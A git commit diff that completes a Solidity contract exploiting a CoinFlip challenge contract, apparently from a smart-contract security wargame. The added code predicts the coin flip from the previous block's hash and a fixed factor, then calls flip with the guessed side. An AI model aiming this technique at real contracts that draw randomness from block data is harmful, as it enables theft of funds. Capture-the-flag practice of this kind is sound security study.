dab95207712c5f75083849e6a1599b782ea81047
Carl Lippert <carl.lippert@gmail.com>
2022-07-04 10:26:45 -0500

    Coinflip solved.

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -4,12 +4,20 @@ import "./CoinFlip.sol";
 
 contract AttackingCoinFlip {
     address public contractAddress;
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip public coinfFlipContract; 
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
+        coinfFlipContract = CoinFlip(contractAddress);
     }
 
     function hackContract() external {
         // Code me!
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        coinfFlipContract.flip(side);
     }
 }
